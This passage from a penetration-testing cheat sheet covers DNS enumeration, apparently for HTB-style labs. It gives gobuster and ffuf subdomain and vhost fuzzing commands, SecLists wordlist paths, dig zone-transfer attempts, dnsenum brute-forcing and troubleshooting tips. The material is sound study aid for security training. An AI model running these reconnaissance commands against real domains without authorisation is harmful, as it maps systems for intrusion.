  --resolver 8.8.8.8 \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -t 50

# Output to file
gobuster dns --domain target.com \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -o gobuster_dns.txt
```

### FFUF DNS Mode

bash

```bash
# Subdomain fuzzing
ffuf -u http://FUZZ.target.com \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# With VHost fuzzing
ffuf -u http://10.129.3.168 \
  -H "Host: FUZZ.inlanefreight.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Filter by status code
ffuf -u http://FUZZ.target.com \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -mc 200

# Silent mode with matches only
ffuf -u http://FUZZ.target.com \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -mc 200 -s
```

---

## 📚 Common DNS Wordlist Locations

bash

```bash
# Kali Linux / Parrot OS locations:
/usr/share/seclists/Discovery/DNS/fierce-hostlist.txt              # ~2000, Windows-focused
/usr/share/seclists/Discovery/DNS/deepmagic.com-prefixes-top500.txt  # 500 common prefixes
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt    # Top 5000
/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt   # Top 20000
/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt  # Top 110000 (huge!)
/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt  # Alternative top 100k

# Default dirb lists (smaller):
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Create custom list for CTFs:
echo -e "admin\ndev\ntest\nstaging\nprod\nmail\nwww\nftp\nvpn\napi" > custom_dns.txt
```

---

## 🎓 DNS Enumeration Best Practices

### 1. Always Follow This Order:

bash

```bash
# a) Check NS records
dig ns domain @DNS_SERVER

# b) Try zone transfer on main domain
dig axfr domain @DNS_SERVER

# c) Try zone transfer on ALL discovered subdomains
dig axfr subdomain.domain @DNS_SERVER

# d) If AXFR fails but SOA exists → brute-force
dnsenum --dnsserver DNS_SERVER -f wordlist subdomain.domain
```

### 2. Use Multiple Wordlists:

bash

```bash
# Start small (fast reconnaissance):
fierce-hostlist.txt (2000 entries)

# If nothing found, go medium:
subdomains-top1million-5000.txt (5000 entries)

# Still nothing? Go large:
subdomains-top1million-20000.txt (20000 entries)

# Last resort (takes hours):
subdomains-top1million-110000.txt (110000 entries)
```

### 3. Different Wordlists Find Different Things:

bash

```bash
# fierce-hostlist.txt → Good for Windows (found win2k!)
# subdomains-top1million → Good for web services
# deepmagic-prefixes → Good for unusual naming conventions
```

### 4. Always Document Your Findings:

bash

```bash
# Create organized output:
mkdir dns_enum
dig axfr inlanefreight.htb @10.129.3.168 > dns_enum/zone_main.txt
dig axfr internal.inlanefreight.htb @10.129.3.168 > dns_enum/zone_internal.txt
dnsenum --dnsserver 10.129.3.168 -f wordlist.txt -o dns_enum/brute_dev.txt dev.inlanefreight.htb

# Create summary:
cat dns_enum/*.txt | grep "IN A" | sort -u > dns_enum/all_hosts.txt
```

---

## ⚠️ Troubleshooting DNS Enumeration

### Issue: "Connection timed out"

bash

```bash
# Check if DNS server is reachable
ping 10.129.3.168
nc -zv 10.129.3.168 53

# Try with TCP instead of UDP
dig +tcp axfr inlanefreight.htb @10.129.3.168

# Increase timeout
dig +time=30 axfr inlanefreight.htb @10.129.3.168
```

### Issue: "Transfer failed"

bash

```bash
# This is NORMAL - means zone transfer is disabled
# Solution: Brute-force with dnsenum/fierce
dig axfr dev.inlanefreight.htb @10.129.3.168
# Output: Transfer failed

# Use brute-force instead:
dnsenum --dnsserver 10.129.3.168 -f fierce-hostlist.txt dev.inlanefreight.htb
```

### Issue: dnsenum finds nothing

bash

```bash
# Try different wordlists (this is CRITICAL!):
# 1. Try fierce-hostlist.txt
# 2. Try subdomains-top1million-5000.txt  
# 3. Try subdomains-top1million-20000.txt

# Verify wordlist path is correct:
ls -la /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt

# Note: Path is case-sensitive!
# WRONG: /usr/share/SecLists (capital S)
# RIGHT: /usr/share/seclists (lowercase s)
```

### Issue: Too slow / Getting rate-limited

bash

```bash
# Reduce threads:
dnsenum --threads 5 ...

# Add delay:
fierce --delay 1 ...

# Use smaller wordlist:
-f /usr/share/seclists/Discovery/DNS/deepmagic.com-prefixes-top500.txt
```